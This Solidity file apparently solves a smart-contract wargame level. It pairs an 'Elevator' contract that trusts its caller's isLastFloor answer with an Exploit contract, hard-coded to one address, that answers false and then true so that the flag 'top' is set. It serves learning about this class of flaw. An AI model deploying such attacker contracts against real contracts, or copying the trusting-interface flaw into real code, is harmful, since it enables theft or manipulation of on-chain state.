// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

interface Building {
  function isLastFloor(uint) external returns (bool);
}


contract Elevator {
  bool public top;
  uint public floor;

  function goTo(uint _floor) public {
    Building building = Building(msg.sender);

    if (! building.isLastFloor(_floor)) {
      floor = _floor;
      top = building.isLastFloor(floor);
    }
  }
}

contract Exploit {
    uint flag = 1;
    Elevator v;
    constructor() public {
        v = Elevator(0xF320ca1974965e5980e9beE4c25c68418336faD7);
    }


    function isLastFloor(uint floor_) external returns (bool) {
        if(flag == 1) {
            flag -= 1;
            return false;
        }
        return true;
    }

    function attack() public {
        v.goTo(flag);
    }
}
